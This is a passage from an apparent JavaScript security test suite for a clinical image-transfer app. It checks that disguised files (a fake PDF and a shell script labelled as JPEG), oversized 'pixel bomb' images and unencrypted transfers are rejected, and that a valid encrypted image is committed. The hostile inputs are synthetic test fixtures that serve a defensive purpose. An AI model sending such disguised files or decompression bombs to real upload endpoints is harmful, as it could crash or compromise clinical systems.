      ack.status === 'HIS_REJECTED' &&
      ack.error === 'INVALID_IMAGE_MAGIC_BYTES' &&
      filesAttached === 0 &&
      uploadsClicked === 0
    );

    reporter.record(
      'TC-CHALLENGE-3.2',
      'End-to-End Pipeline: Disguised Bash script disguised as image/jpeg is rejected with INVALID_IMAGE_MAGIC_BYTES (0 DOM files)',
      pass,
      `ackStatus=${ack?.status}, ackError=${ack?.error}, filesAttached=${filesAttached}, uploadsClicked=${uploadsClicked}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-3.2', 'Pipeline magic byte shell script check', false, '', err);
  }

  // Test 3.3: Full Pipeline Magic Byte Enforcement: Disguised PDF via Supabase Realtime
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const ws = desktopEnv.getActiveWebSocket();
    const session = desktopEnv.getClinicalSession();
    const cryptoKey = session.cryptoKey;
    const sid = session.sessionId;
    const tid = 'tx_disguised_pdf';

    const fakePdf = '%PDF-1.7\n1 0 obj\n<< /Filter /FlateDecode >>\nstream\nmalicious_content\nendstream\nendobj\n';
    const fakeContainer = JSON.stringify({
      image: fakePdf,
      mimeType: 'image/jpeg',
      meta: { patientId: '998877' }
    });

    const aad = { v: 2, sid, transferId: tid, contentType: 'image/jpeg' };
    const encRes = await CamSyncCrypto.encryptAesGcmPayload(cryptoKey, fakeContainer, aad);

    ws.simulateBroadcast('chunk_start', {
      v: 2,
      sid,
      transferId: tid,
      totalChunks: 1,
      encryptedBytes: encRes.data.length,
      contentType: 'image/jpeg',
      encrypted: true,
      iv: encRes.iv
    });

    ws.simulateBroadcast('chunk_data', {
      v: 2,
      sid,
      transferId: tid,
      chunkIndex: 0,
      chunk: encRes.data,
      encrypted: true,
      iv: encRes.iv
    });

    ws.simulateBroadcast('chunk_complete', {
      v: 2,
      sid,
      transferId: tid
    });

    await new Promise(r => setTimeout(r, 40));

    const ackMsg = ws.sent.find(m => m.payload?.payload?.transferId === tid || m.payload?.payload?.error === 'INVALID_IMAGE_MAGIC_BYTES');
    const ackPayload = ackMsg?.payload?.payload;
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const uploadsClicked = desktopEnv.getUploadClickCount();

    const pass = (
      ackPayload !== undefined &&
      ackPayload.status === 'HIS_REJECTED' &&
      ackPayload.error === 'INVALID_IMAGE_MAGIC_BYTES' &&
      filesAttached === 0 &&
      uploadsClicked === 0
    );

    reporter.record(
      'TC-CHALLENGE-3.3',
      'End-to-End Pipeline: Disguised PDF disguised as image/jpeg over Realtime rejected with INVALID_IMAGE_MAGIC_BYTES',
      pass,
      `ackStatus=${ackPayload?.status}, ackError=${ackPayload?.error}, filesAttached=${filesAttached}, uploadsClicked=${uploadsClicked}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-3.3', 'Pipeline magic byte PDF check', false, '', err);
  }

  // --------------------------------------------------------------------------
  // SUITE 4: Anti-Decompression & Pixel Bomb Defense
  // --------------------------------------------------------------------------
  reporter.group('SUITE 4: Pixel Bomb & Anti-Decompression Defense');

  // Test 4.1: Direct Binary Dimension Extraction & Limits Evaluation
  const dimensionVectors = [
    { name: 'JPEG 10000x10000 (100MP, >8192px)', type: 'jpeg', w: 10000, h: 10000, expectLimits: false },
    { name: 'JPEG 5000x4000 (20MP > 16MP, <=8192px)', type: 'jpeg', w: 5000, h: 4000, expectLimits: false },
    { name: 'JPEG 9000x100 (>8192px)', type: 'jpeg', w: 9000, h: 100, expectLimits: false },
    { name: 'JPEG 4000x3000 (12MP, normal)', type: 'jpeg', w: 4000, h: 3000, expectLimits: true },
    { name: 'PNG 8193x1000 (>8192px)', type: 'png', w: 8193, h: 1000, expectLimits: false },
    { name: 'PNG 5000x5000 (25MP > 16MP)', type: 'png', w: 5000, h: 5000, expectLimits: false },
    { name: 'PNG 1920x1080 (2MP, normal)', type: 'png', w: 1920, h: 1080, expectLimits: true }
  ];

  for (const [idx, v] of dimensionVectors.entries()) {
    try {
      const binary = v.type === 'jpeg' ? createSyntheticJpeg(v.w, v.h) : createSyntheticPng(v.w, v.h);
      const dims = CamSyncCrypto.extractImageDimensions(binary);
      const withinLimits = CamSyncCrypto.isWithinImageLimits(dims.width, dims.height);

      const pass = (
        dims.valid === true &&
        dims.width === v.w &&
        dims.height === v.h &&
        withinLimits === v.expectLimits
      );

      reporter.record(
        `TC-CHALLENGE-4.1.${idx + 1}`,
        `Dimension parser for ${v.name}: extracted ${dims.width}x${dims.height}, limits=${withinLimits}`,
        pass,
        `valid=${dims.valid}, parsed=${dims.width}x${dims.height}, withinLimits=${withinLimits} (expected ${v.expectLimits})`
      );
    } catch (err) {
      reporter.record(`TC-CHALLENGE-4.1.${idx + 1}`, `Dimension parser: ${v.name}`, false, '', err);
    }
  }

  // Test 4.2: Full Pipeline Pixel Bomb: JPEG 10000x10000 (100MP) via WebRTC
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const peer = desktopEnv.getActivePeer();
    const conn = peer.connectSimulatedPhone();
    await new Promise(r => setTimeout(r, 20));

    const session = desktopEnv.getClinicalSession();
    const cryptoKey = session.cryptoKey;
    const sid = session.sessionId;
    const tid = 'tx_pixel_bomb_jpeg';

    const bombJpeg = createSyntheticJpeg(10000, 10000);
    const bombB64 = bombJpeg.toString('base64');
    const container = JSON.stringify({
      image: bombB64,
      mimeType: 'image/jpeg',
      meta: { patientId: '998877' }
    });

    const aad = { v: 2, sid, transferId: tid, contentType: 'image/jpeg' };
    const encRes = await CamSyncCrypto.encryptAesGcmPayload(cryptoKey, container, aad);

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferStart',
      totalChunks: 1,
      encryptedBytes: encRes.data.length,
      contentType: 'image/jpeg',
      encrypted: true,
      iv: encRes.iv
    });

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferChunk',
      index: 0,
      data: encRes.data,
      encrypted: true,
      iv: encRes.iv
    });

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferEnd'
    });

    await new Promise(r => setTimeout(r, 40));

    const ack = conn.sent.find(m => m.transferId === tid || m.type === 'TRANSFER_ACK');
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const uploadsClicked = desktopEnv.getUploadClickCount();

    const pass = (
      ack !== undefined &&
      ack.status === 'HIS_REJECTED' &&
      ack.error === 'PIXEL_BOMB_DETECTED' &&
      filesAttached === 0 &&
      uploadsClicked === 0
    );

    reporter.record(
      'TC-CHALLENGE-4.2',
      'End-to-End Pipeline: 10000x10000 (100MP) JPEG pixel bomb rejected with PIXEL_BOMB_DETECTED before canvas rendering',
      pass,
      `ackStatus=${ack?.status}, ackError=${ack?.error}, filesAttached=${filesAttached}, uploadsClicked=${uploadsClicked}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-4.2', 'Pipeline JPEG pixel bomb check', false, '', err);
  }

  // Test 4.3: Full Pipeline Pixel Bomb: PNG 8500x8500 (>8192px & >16MP) via Realtime
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const ws = desktopEnv.getActiveWebSocket();
    const session = desktopEnv.getClinicalSession();
    const cryptoKey = session.cryptoKey;
    const sid = session.sessionId;
    const tid = 'tx_pixel_bomb_png';

    const bombPng = createSyntheticPng(8500, 8500);
    const bombB64 = bombPng.toString('base64');
    const container = JSON.stringify({
      image: bombB64,
      mimeType: 'image/png',
      meta: { patientId: '998877' }
    });

    const aad = { v: 2, sid, transferId: tid, contentType: 'image/png' };
    const encRes = await CamSyncCrypto.encryptAesGcmPayload(cryptoKey, container, aad);

    ws.simulateBroadcast('chunk_start', {
      v: 2,
      sid,
      transferId: tid,
      totalChunks: 1,
      encryptedBytes: encRes.data.length,
      contentType: 'image/png',
      encrypted: true,
      iv: encRes.iv
    });

    ws.simulateBroadcast('chunk_data', {
      v: 2,
      sid,
      transferId: tid,
      chunkIndex: 0,
      chunk: encRes.data,
      encrypted: true,
      iv: encRes.iv
    });

    ws.simulateBroadcast('chunk_complete', {
      v: 2,
      sid,
      transferId: tid
    });

    await new Promise(r => setTimeout(r, 40));

    const ackMsg = ws.sent.find(m => m.payload?.payload?.transferId === tid || m.payload?.payload?.error === 'PIXEL_BOMB_DETECTED');
    const ackPayload = ackMsg?.payload?.payload;
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const uploadsClicked = desktopEnv.getUploadClickCount();

    const pass = (
      ackPayload !== undefined &&
      ackPayload.status === 'HIS_REJECTED' &&
      ackPayload.error === 'PIXEL_BOMB_DETECTED' &&
      filesAttached === 0 &&
      uploadsClicked === 0
    );

    reporter.record(
      'TC-CHALLENGE-4.3',
      'End-to-End Pipeline: 8500x8500 PNG pixel bomb over Realtime rejected with PIXEL_BOMB_DETECTED',
      pass,
      `ackStatus=${ackPayload?.status}, ackError=${ackPayload?.error}, filesAttached=${filesAttached}, uploadsClicked=${uploadsClicked}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-4.3', 'Pipeline PNG pixel bomb check', false, '', err);
  }

  // --------------------------------------------------------------------------
  // SUITE 5: Explicit Unencrypted Transfer Rejection (Gate G1 Fail-Closed)
  // --------------------------------------------------------------------------
  reporter.group('SUITE 5: Gate G1 Explicit Unencrypted Transfer Rejection');

  // Test 5.1: WebRTC transfer with explicit encrypted: false
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const peer = desktopEnv.getActivePeer();
    const conn = peer.connectSimulatedPhone();
    await new Promise(r => setTimeout(r, 20));

    const tid = 'tx_unenc_webrtc';
    const plainJpeg = createSyntheticJpeg(800, 600).toString('base64');

    conn.simulateData({
      v: 2,
      sid: desktopEnv.getActiveSessionId(),
      transferId: tid,
      type: 'TransferStart',
      totalChunks: 1,
      encryptedBytes: plainJpeg.length,
      contentType: 'image/jpeg',
      encrypted: false // Explicitly unencrypted
    });

    conn.simulateData({
      v: 2,
      sid: desktopEnv.getActiveSessionId(),
      transferId: tid,
      type: 'TransferChunk',
      index: 0,
      data: plainJpeg,
      encrypted: false
    });

    conn.simulateData({
      v: 2,
      sid: desktopEnv.getActiveSessionId(),
      transferId: tid,
      type: 'TransferEnd'
    });

    await new Promise(r => setTimeout(r, 40));

    const ack = conn.sent.find(m => m.transferId === tid || m.type === 'TRANSFER_ACK');
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const uploadsClicked = desktopEnv.getUploadClickCount();

    const pass = (
      ack !== undefined &&
      ack.status === 'HIS_REJECTED' &&
      ack.error === 'DECRYPTION_FAILED' &&
      filesAttached === 0 &&
      uploadsClicked === 0
    );

    reporter.record(
      'TC-CHALLENGE-5.1',
      'WebRTC: Explicit unencrypted transfer (encrypted: false) rejected fail-closed with DECRYPTION_FAILED (0 DOM files, 0 clicks)',
      pass,
      `ackStatus=${ack?.status}, ackError=${ack?.error}, filesAttached=${filesAttached}, uploadsClicked=${uploadsClicked}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-5.1', 'WebRTC unencrypted fail-closed', false, '', err);
  }

  // Test 5.2: Supabase Realtime transfer with explicit encrypted: false
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const ws = desktopEnv.getActiveWebSocket();
    const tid = 'tx_unenc_realtime';
    const plainJpeg = createSyntheticJpeg(800, 600).toString('base64');

    ws.simulateBroadcast('chunk_start', {
      v: 2,
      sid: desktopEnv.getActiveSessionId(),
      transferId: tid,
      totalChunks: 1,
      totalBytes: plainJpeg.length,
      mimeType: 'image/jpeg',
      encrypted: false // Explicit unencrypted
    });

    ws.simulateBroadcast('chunk_data', {
      v: 2,
      sid: desktopEnv.getActiveSessionId(),
      transferId: tid,
      chunkIndex: 0,
      chunk: plainJpeg,
      encrypted: false
    });

    ws.simulateBroadcast('chunk_complete', {
      v: 2,
      sid: desktopEnv.getActiveSessionId(),
      transferId: tid
    });

    await new Promise(r => setTimeout(r, 40));

    const ackMsg = ws.sent.find(m => m.payload?.payload?.transferId === tid || m.payload?.payload?.error === 'DECRYPTION_FAILED');
    const ackPayload = ackMsg?.payload?.payload;
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const uploadsClicked = desktopEnv.getUploadClickCount();

    const pass = (
      ackPayload !== undefined &&
      ackPayload.status === 'HIS_REJECTED' &&
      ackPayload.error === 'DECRYPTION_FAILED' &&
      filesAttached === 0 &&
      uploadsClicked === 0
    );

    reporter.record(
      'TC-CHALLENGE-5.2',
      'Realtime: Explicit unencrypted transfer (encrypted: false) rejected fail-closed with DECRYPTION_FAILED (0 DOM files, 0 clicks)',
      pass,
      `ackStatus=${ackPayload?.status}, ackError=${ackPayload?.error}, filesAttached=${filesAttached}, uploadsClicked=${uploadsClicked}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-5.2', 'Realtime unencrypted fail-closed', false, '', err);
  }

  // Test 5.3: Legitimate Encrypted V2 transfer succeeds with 100% bit fidelity and HIS commit
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const peer = desktopEnv.getActivePeer();
    const conn = peer.connectSimulatedPhone();
    await new Promise(r => setTimeout(r, 20));

    const session = desktopEnv.getClinicalSession();
    const cryptoKey = session.cryptoKey;
    const sid = session.sessionId;
    const tid = 'tx_legitimate_v2';

    const validJpeg = createSyntheticJpeg(1920, 1080);
    const validB64 = validJpeg.toString('base64');
    const container = JSON.stringify({
      image: validB64,
      mimeType: 'image/jpeg',
      meta: { patientId: '998877' }
    });

    const aad = { v: 2, sid, transferId: tid, contentType: 'image/jpeg' };
    const encRes = await CamSyncCrypto.encryptAesGcmPayload(cryptoKey, container, aad);

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferStart',
      totalChunks: 1,
      encryptedBytes: encRes.data.length,
      contentType: 'image/jpeg',
      encrypted: true,
      iv: encRes.iv
    });

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferChunk',
      index: 0,
      data: encRes.data,
      encrypted: true,
      iv: encRes.iv
    });

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferEnd'
    });

    await new Promise(r => setTimeout(r, 40));

    const ack = conn.sent.find(m => m.transferId === tid || m.type === 'TRANSFER_ACK');
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const photoCount = desktopEnv.getPhotoCount();

    const pass = (
      ack !== undefined &&
      ack.status === 'HIS_COMMITTED' &&
      ack.success === true &&
      filesAttached === 1 &&
      photoCount === 1
    );

    reporter.record(
      'TC-CHALLENGE-5.3',
      'Legitimate E2EE Transfer: Encrypted 1080p JPEG passes all bounds, magic bytes, dimensions, and commits to HIS',
      pass,
      `ackStatus=${ack?.status}, success=${ack?.success}, filesAttached=${filesAttached}, photoCount=${photoCount}`
    );
    desktopEnv.cleanup();
  } catch (err) {
    reporter.record('TC-CHALLENGE-5.3', 'Legitimate E2EE transfer check', false, '', err);
  }

  const allPassed = reporter.summary();
  process.exit(allPassed ? 0 : 1);
}

runAllTests().catch(err => {
  console.error('Fatal runner error:', err);
  process.exit(1);
});
